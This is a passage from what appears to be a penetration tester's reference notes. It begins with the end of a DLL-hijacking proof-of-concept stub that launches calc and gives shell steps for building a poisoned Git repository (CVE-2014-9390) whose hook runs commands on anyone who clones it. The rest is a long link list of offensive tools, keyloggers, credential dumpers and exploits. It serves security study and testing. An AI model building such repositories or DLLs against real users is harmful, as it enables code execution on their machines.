WinExec("calc", SW_NORMAL);
}
extern "C" __declspec(dllexport) void DeleteIpNetEntry()
{
WinExec("calc", SW_NORMAL);
}</p></td>
```

<span id="anchor-447"></span>CVE Repositories

[*https://nvd.nist.gov/*](https://nvd.nist.gov/)

[*http://cve.mitre.org/index.html*](http://cve.mitre.org/index.html)

[*http://www.cvedetails.com/*](http://www.cvedetails.com/)

[*https://www.scaprepo.com/*](https://www.scaprepo.com/)

[*http://secpod.com/*](http://secpod.com/)

[*http://osvdb.org/*](http://osvdb.org/)

[*http://www.exploit-db.com/*](http://www.exploit-db.com/)

[*https://github.com/athiasjerome/XORCISM*](https://github.com/athiasjerome/XORCISM)

<span id="anchor-448"></span>Bug Repositories

<span id="anchor-449"></span>Git

<span id="anchor-450"></span>CVE-2014-9390

[*https://community.rapid7.com/community/metasploit/blog/2015/01/01/12-days-of-haxmas-exploiting-cve-2014-9390-in-git-and-mercurial*](https://community.rapid7.com/community/metasploit/blog/2015/01/01/12-days-of-haxmas-exploiting-cve-2014-9390-in-git-and-mercurial)

[*https://github.com/rapid7/metasploit-framework/issues/4435*](https://github.com/rapid7/metasploit-framework/issues/4435)

This exploit relies on the machine running Git to be using a file system
that ignores case (i.e. Windows, OS X)

Building a poisoned Git repository:

```
$ mkdir -p &lt;repository_folder&gt;/.Git/hooks/
$ cd &lt;repository_folder&gt;
$ git init
$ echo "&lt;command to run&gt;" &gt; .Git/hooks/post-checkout
$ git add -A
$ git commit - 'poisoned'</p></td>
```

Once this poisoned Git repository is cloned the command in the
post-checkout will be run on the machine that it is being cloned to. The
command will run with the rights of the user running Git.

<span id="anchor-451"></span>Default Password Links

[*http://www.cirt.net/passwords*](http://www.cirt.net/passwords)

[*http://www.virus.org/default-passwords/*](http://www.virus.org/default-passwords/)

[*http://www.routerpasswords.com/*](http://www.routerpasswords.com/)

[*https://www.security-database.com/dbe.php*](https://www.security-database.com/dbe.php)

<span id="anchor-452"></span>Useful Links

<span id="anchor-453"></span>GitHub Links

<span id="anchor-454"></span>ETW Keylogger POC

-   [*https://github.com/CyberPoint/Ruxcon2016ETW/tree/master/KeyloggerPOC*](https://github.com/CyberPoint/Ruxcon2016ETW/tree/master/KeyloggerPOC)

<span id="anchor-455"></span>SubTee (Casey Smith) C\# Keylogger

-   [*https://gist.github.com/subTee/c51ea995dfaf919fd4bd36b3f7252486*](https://gist.github.com/subTee/c51ea995dfaf919fd4bd36b3f7252486)
-   [*https://gist.github.com/subTee/d32a4912b2798197663e883ea6a68937*](https://gist.github.com/subTee/d32a4912b2798197663e883ea6a68937)

<span id="anchor-456"></span>HackSysTeam Extreme Vulnerability Driver
(HEVD)

-   [*https://github.com/GradiusX/HEVD-Python-Solutions*](https://github.com/GradiusX/HEVD-Python-Solutions)

<span id="anchor-457"></span>DLLInjector

-   [*https://github.com/OpenSecurityResearch/dllinjector*](https://github.com/OpenSecurityResearch/dllinjector)

<span id="anchor-458"></span>PowerShell Tools

<span id="anchor-459"></span>Empire

-   [*https://github.com/PowerShellEmpire/Empire*](https://github.com/PowerShellEmpire/Empire)

<span id="anchor-460"></span>PowerSploit

-   [*https://github.com/PowerShellMafia/PowerSploit*](https://github.com/PowerShellMafia/PowerSploit)

<span id="anchor-461"></span>Nishang

-   [*https://github.com/samratashok/nishang*](https://github.com/samratashok/nishang)

<span id="anchor-462"></span>PowerUpSQL

-   [*https://github.com/NetSPI/PowerUpSQL*](https://github.com/NetSPI/PowerUpSQL)

<span id="anchor-463"></span>P0wnedShell

-   [*https://github.com/Cn33liz/p0wnedShell*](https://github.com/Cn33liz/p0wnedShell)

<span id="anchor-464"></span>Awesomershell

-   [*https://github.com/Ben0xA/AwesomerShell*](https://github.com/Ben0xA/AwesomerShell)

<span id="anchor-465"></span>Not PowerShell (nps)

-   [*https://github.com/Ben0xA/nps*](https://github.com/Ben0xA/nps)

<span id="anchor-466"></span>Other Things

<span id="anchor-467"></span>PyKEK (Python Kerberos Exploitation Kit)

-   [*https://github.com/bidord/pykek*](https://github.com/bidord/pykek)

<span id="anchor-468"></span>Misc Scripts

-   [*http://thesprawl.org/research/writing-nse-scripts-for-vulnerability-scanning/*](http://thesprawl.org/research/writing-nse-scripts-for-vulnerability-scanning/)
-   [*http://www.scip.ch/?labs.20130625*](http://www.scip.ch/?labs.20130625)
-   [*https://www.powershellgallery.com/packages/Save-ScreenCapture/1.0.0.0/DisplayScript*](https://www.powershellgallery.com/packages/Save-ScreenCapture/1.0.0.0/DisplayScript)
-   [*https://www.powershellgallery.com/packages/Test-IsVirtual/1.0.0.0/DisplayScript*](https://www.powershellgallery.com/packages/Test-IsVirtual/1.0.0.0/DisplayScript)

<span id="anchor-469"></span>Kyle’s Notes

-   [*https://www.evernote.com/pub/kbisdorf/adsim*](https://www.evernote.com/pub/kbisdorf/adsim)

<span id="anchor-470"></span>Google Hacking Links

-   [*https://www.exploit-db.com/google-hacking-database/*](https://www.exploit-db.com/google-hacking-database/)

<span id="anchor-471"></span>Hot Potato (Privilege Escalation)

-   [*https://github.com/foxglovesec/Potato*](https://github.com/foxglovesec/Potato)

<span id="anchor-472"></span>Raspberry PI as a USB Device

-   [*http://isticktoit.net/?p=1383*](http://isticktoit.net/?p=1383)
-   [*https://learn.adafruit.com/turning-your-raspberry-pi-zero-into-a-usb-gadget?view=all*](https://learn.adafruit.com/turning-your-raspberry-pi-zero-into-a-usb-gadget?view=all)
-   [*https://learn.adafruit.com/turning-your-raspberry-pi-zero-into-a-usb-gadget/ethernet-gadget*](https://learn.adafruit.com/turning-your-raspberry-pi-zero-into-a-usb-gadget/ethernet-gadget)

<span id="anchor-473"></span>PoisonTap (Raspberry PI USB Ethernet
Device)

-   [*https://github.com/samyk/poisontap*](https://github.com/samyk/poisontap)

<span id="anchor-474"></span>USB Ethernet Device Driver Example

-   [*https://github.com/ev3dev/ev3-systemd/blob/ev3dev-jessie/scripts/ev3-usb.sh*](https://github.com/ev3dev/ev3-systemd/blob/ev3dev-jessie/scripts/ev3-usb.sh)

<span id="anchor-475"></span>Responder

-   [*https://github.com/lgandx/Responder.git*](https://github.com/lgandx/Responder.git)

<span id="anchor-476"></span>Pi USB Ethernet

-   [*https://hackaday.io/project/10387-gadget/log/34463-on-windows-drivers-and-usb-gadgets*](https://hackaday.io/project/10387-gadget/log/34463-on-windows-drivers-and-usb-gadgets)
-   [*http://isticktoit.net/?p=1383*](http://isticktoit.net/?p=1383)
-   [*https://www.kernel.org/doc/Documentation/usb/gadget\_configfs.txt*](https://www.kernel.org/doc/Documentation/usb/gadget_configfs.txt)
-   [*https://groups.google.com/forum/m/\#!msg/beaglebone/IKV0g14oYRQ/8Z\_vEv\_fAwAJ*](https://groups.google.com/forum/m/#!msg/beaglebone/IKV0g14oYRQ/8Z_vEv_fAwAJ)

<span id="anchor-477"></span>Manually Interacting w/HTTP

-   [*http://www.the-art-of-web.com/system/telnet-http11/*](http://www.the-art-of-web.com/system/telnet-http11/)

<span id="anchor-478"></span>Fingerprinting IIS

-   [*https://blogs.msdn.microsoft.com/vijaysk/2010/09/01/fingerprinting-iis/*](https://blogs.msdn.microsoft.com/vijaysk/2010/09/01/fingerprinting-iis/)

<span id="anchor-479"></span>Old AccessChk.exe

-   [*https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe*](https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe)

<span id="anchor-480"></span>DLL Injection

-   [*http://blog.opensecurityresearch.com/2013/01/windows-dll-injection-basics.html?m=1*](http://blog.opensecurityresearch.com/2013/01/windows-dll-injection-basics.html?m=1)

<span id="anchor-481"></span>MS14-068 (Pass-the-Credential Cache)

-   [*https://labs.mwrinfosecurity.com/blog/digging-into-ms14-068-exploitation-and-defence/*](https://labs.mwrinfosecurity.com/blog/digging-into-ms14-068-exploitation-and-defence/)
-   [*https://www.trustedsec.com/december-2014/ms14-068-full-compromise-step-step/*](https://www.trustedsec.com/december-2014/ms14-068-full-compromise-step-step/)

<span id="anchor-482"></span>Dumping Credentials

-   [*https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/*](https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/)

<span id="anchor-483"></span>IIS 6.0 Exploit (CVE-2017-7269)

-   [*https://github.com/edwardz246003/IIS\_exploit/blob/master/exploit.py*](https://github.com/edwardz246003/IIS_exploit/blob/master/exploit.py)
-   [*https://github.com/zcgonvh/cve-2017-7269/blob/master/cve-2017-7269.rb*](https://github.com/zcgonvh/cve-2017-7269/blob/master/cve-2017-7269.rb)
-   [*https://www.exploit-db.com/exploits/41738/*](https://www.exploit-db.com/exploits/41738/)

<span id="anchor-484"></span>MimiPenguin

-   [*https://github.com/huntergregal/mimipenguin*](https://github.com/huntergregal/mimipenguin)

<span id="anchor-485"></span>HackSys Extreme Vulnerable Driver (HEVD)

-   [*https://github.com/hacksysteam/HackSysExtremeVulnerableDriver*](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver)

<span id="anchor-486"></span>HackSysTeam-KernelPwn (@FuzzySec, uses
HEVD)

-   [*https://github.com/FuzzySecurity/HackSysTeam-PSKernelPwn*](https://github.com/FuzzySecurity/HackSysTeam-PSKernelPwn)

<span id="anchor-487"></span>Less Dirty Cow (Crontab)

-   [*https://github.com/securifera/cowcron*](https://github.com/securifera/cowcron)

<span id="anchor-488"></span>Shellcode Via JavaScript Via VBA (@subTee)

-   [*https://gist.github.com/subTee/439fb5dba5edf4d1e3c38b9a24f886d3\#file-example-js-L5-L6*](https://gist.github.com/subTee/439fb5dba5edf4d1e3c38b9a24f886d3#file-example-js-L5-L6)

<span id="anchor-489"></span>Office Add-In Persistence (@William\_Knows)

-   [*https://labs.mwrinfosecurity.com/blog/add-in-opportunities-for-office-persistence/*](https://labs.mwrinfosecurity.com/blog/add-in-opportunities-for-office-persistence/)

<span id="anchor-490"></span>DLL Tricks with VBA to Improve Offensive
Macro Capability

-   [*https://labs.mwrinfosecurity.com/blog/dll-tricks-with-vba-to-improve-offensive-macro-capability/*](https://labs.mwrinfosecurity.com/blog/dll-tricks-with-vba-to-improve-offensive-macro-capability/)

<span id="anchor-491"></span>WePWNise - Office Template Persistence

-   [*https://github.com/mwrlabs/wePWNise*](https://github.com/mwrlabs/wePWNise)

<span id="anchor-492"></span>Sentinel DLL/EXE Path Hijacking Detection
Tool

-   [*https://skanthak.homepage.t-online.de/sentinel.html*](https://skanthak.homepage.t-online.de/sentinel.html)

<span id="anchor-493"></span>Converting Mimikatz to a DLL to Be Loaded
Reflectively

-   [*https://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/*](https://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/)

<span id="anchor-494"></span>Sandbox Breakouts (nodejs/javascript)

-   [*http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine*](http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine)

<span id="anchor-495"></span>Shellcoding

<span id="anchor-496"></span>64-Bit Shellcoding Tutorial

-   [*http://mcdermottcybersecurity.com/articles/windows-x64-shellcode*](http://mcdermottcybersecurity.com/articles/windows-x64-shellcode)

<span id="anchor-497"></span>Portable Executable (PE) File Information

<span id="anchor-498"></span>An In-Depth Look into the Win32 Portable
Executable File Format

-   PDF files have been saved to Google Drive as they are no longer
    available from Microsoft. [*Part
    1*](https://drive.google.com/open?id=12XHlJU8Art2PyfqpGcYF4K64IPIitXK6),
    [*Part 1
    Figures*](https://drive.google.com/open?id=1LZsLFq3MfLeeybbqmk6AM817bDjfng9r)
    & [*Part
    2*](https://drive.google.com/open?id=1xCtTgPR67vYz1YhVQV9uv4bhyk_8hlmD),
    [*Part 2
    Figures*](https://drive.google.com/open?id=1IuKuF16oFUP5cKA6dm7BPLiYFp1jcRYK)

<span id="anchor-499"></span>SQL Injection

-   [*https://websec.ca/kb/sql\_injection*](https://websec.ca/kb/sql_injection)
-   [*https://resources.infosecinstitute.com/dumping-a-database-using-sql-injection/*](https://resources.infosecinstitute.com/dumping-a-database-using-sql-injection/)
-   [*https://portswigger.net/web-security/sql-injection/cheat-sheet*](https://portswigger.net/web-security/sql-injection/cheat-sheet)
-   
